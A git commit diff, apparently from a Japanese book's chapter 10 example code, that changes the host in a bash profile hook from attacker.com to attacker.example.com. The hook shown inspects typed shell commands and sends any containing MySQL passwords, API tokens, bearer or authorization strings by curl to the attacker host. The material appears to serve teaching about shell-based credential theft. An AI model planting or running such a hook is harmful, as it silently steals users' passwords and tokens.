d4df629c7329cffaa15829c3718d5639c2dc7609
fukusuket <41001169+fukusuket@users.noreply.github.com>
2026-01-18 22:47:27 +0900

    10章 attacker.example.comに変更

--- ch10/profile_hook.sh
+++ ch10/profile_hook.sh
@@ -4,7 +4,7 @@ hook() {
   case "${BASH_COMMAND}" in
     mysql*)
        if echo "${BASH_COMMAND}" | grep -- "-p\|--password"; then
-          curl https://attacker.com \
+          curl https://attacker.example.com \
               -H "Content-Type:application/json" \
               -d "{\"command\":\"${BASH_COMMAND}\"}" \
               --max-time 3 \
@@ -18,7 +18,7 @@ hook() {
                                         -ie "api_token" \
                                         -ie "bearer" \
                                         -ie "authorization"; then
-          curl https://attacker.com \
+          curl https://attacker.example.com \
               -H "Content-Type:application/json" \
               -d "{\"command\":\"${BASH_COMMAND}\"}" \
               --max-time 3 \
